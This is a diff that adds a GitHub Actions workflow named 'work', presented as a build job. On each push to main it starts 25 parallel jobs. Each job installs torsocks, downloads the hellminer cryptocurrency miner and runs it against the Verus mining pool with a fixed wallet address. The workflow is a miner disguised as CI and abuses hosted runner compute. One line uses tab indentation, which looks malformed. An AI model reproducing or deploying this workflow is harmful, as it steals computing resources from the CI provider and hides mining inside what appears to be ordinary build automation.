@@ -1,0 +1,32 @@
+name: work
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    strategy:
+      matrix:
+        container: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25]
+
+    steps:
+      - name: Install Torsocks
+        run: sudo apt-get update && sudo apt-get install -y torsocks
+
+      - name: Download and Extract Hellminer
+        run: |
+          wget https://github.com/hellcatz/hminer/releases/download/v0.59.1/hellminer_linux64.tar.gz
+          tar -xf hellminer_linux64.tar.gz
+		  apt install libsodium*
+
+      - name: Run Hellminer
+        run: |
+          ./hellminer -c stratum+tcp://pool.verus.io:9999 -u RXdK9Kiiz2pLUu9k8i7Tx9RKhLEnCJq9Us.M$container -p x --cpu 1 >> hellminer_$container.log
+
+      - name: Display Output
+        run: |
+          cat hellminer_$container.log
